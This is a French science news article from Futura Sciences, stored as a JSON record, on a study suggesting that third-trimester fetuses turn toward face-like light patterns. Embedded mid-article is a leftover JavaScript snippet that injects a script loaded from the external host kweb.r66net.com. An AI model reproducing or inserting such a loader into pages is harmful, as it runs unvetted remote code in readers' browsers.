{"title": "Les foetus peuvent-ils reconnaitre les visages ?", "newspaper": "Futura Sciences", "author": ["Marie-Celine Jacquier"], "date_publi": "2017-06-09", "content": "Une etude britannique suggere que dans l'uterus, les bebes preferent des images ressemblant a des visages, ce qui expliquerait qu'ils les reconnaissent des la naissance. Toutefois, l'etude ne fait pas l'unanimite dans la communaute scientifique.  Ce qu'il faut retenir Les sens, comme la vue et l'audition, se developpent dans le ventre de la mere. A huit mois de grossesse, des foetus tournent la tete vers une image qui ressemble a un visage. Il y aurait une predisposition des bebes a preferer les visages. A la naissance, les bebes s'interessent deja aux visages qu'ils voient pour la premiere fois. Mais qu'en est-il avant, dans l' uterus  ? Le developpement de la vision a lieu au milieu de la  grossesse  et c'est au cours du dernier trimestre que le  foetus  distingue des formes lumineuses. Mais a la naissance, son acuite visuelle n'est pas tres bonne, c'est pourquoi le foetus doit lui aussi voir flou. Dans une nouvelle recherche parue dans  Curent Biology , des chercheurs de l'universite de Lancaster ont montre a des bebes encore dans le ventre de leur mere, un stimulus ressemblant a un  visage  : il s'agissait de points lumineux arranges de maniere a ressembler aux  yeux  et a la bouche d'un visage. Ces images ont ete presentees a travers la paroi uterine de 39 femmes enceintes de 34 semaines (8 mois).  Quand on leur projetait ces visuels, les  bebes  tournaient la tete pour les regarder. Si le meme arrangement de points lumineux etait inverse, de telle facon qu'il etait plus complique de les reconnaitre, les foetus ne reagissaient pas. Les sens du bebe commencent a se developper dans le ventre de sa mere, d'ou l'interet de lui parler avant la naissance. (c) Andrey Bandurenko, Fotolia                               Les bebes seraient predisposes a reconnaitre les visages Les chercheurs montrent donc que les foetus humains dans le troisieme trimestre de  grossesse  preferent regarder ce qui ressemble a des visages. Cette reconnaissance pourrait donc se developper avant meme qu'il ait vu ses parents, apres la  naissance . Par ailleurs, l'experience montre aussi qu'il est possible de montrer des stimulus visuels de cette maniere a un foetus, dans le ventre de sa mere.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  \" Le foetus au troisieme trimestre peut tres bien entendre. J'aimerais encourager les parents a lire des livres. Ses sens se developpent deja dans l' uterus . Aussi, c'est pourquoi les futurs parents sont invites a interagir avec lui avant la naissance par differentes methodes comme l'haptonomie.  Pour Vincent Reid, qui a mene cette recherche et qui s'exprime dans le  Telegraph  :   << le foetus au troisieme trimestre peut tres bien entendre. J'aimerais encourager les parents a lire des livres >> , ce qui les aiderait a etablir un lien avec leur enfant. Cependant, il deconseille aux futures mamans d'eclairer leur ventre avec une  lumiere  puissante, cela afin d'eviter d'endommager les yeux de leur bebe. A noter que d'autres scientifiques ont emis des reserves quant a ces resultats. D'apres le site  Gizmodo , certains estiment que le  protocole  mis en place ne permet pas de demontrer que ce sont bien des visages que les foetus reconnaissent. Un accouchement filme par IRM                       Pour la premiere fois, des scientifiques de la Charite - Universitatsmedizin a Berlin ont filme la naissance d'un bebe par imagerie par resonance magnetique (IRM). Les images sont diffusees en accelere.                                       ", "theme": "sante"}